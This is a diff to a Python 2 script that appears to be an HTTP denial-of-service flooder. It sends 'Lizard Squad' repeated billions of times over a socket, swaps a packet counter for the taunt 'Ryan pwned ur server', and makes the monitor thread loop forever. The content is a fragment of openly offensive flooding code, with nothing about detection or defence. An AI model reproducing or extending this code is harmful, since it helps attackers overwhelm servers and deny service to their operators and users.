@@ -87,9 +87,7 @@ def httpcall(url):
 			s.send("Lizard Squad" * 666666666666)
 	except socket.error as e:
 			#print e.code
-			sent = 666666666666
-			sent += 1
-			print 'Pps: %s' % sent
+			print 'Ryan pwned ur server'
 			code=500
 	else:
 			inc_counter()
@@ -113,7 +111,7 @@ class HTTPThread(threading.Thread):
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
-		while flag==0:
+		while True:
 			if (previous+100<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
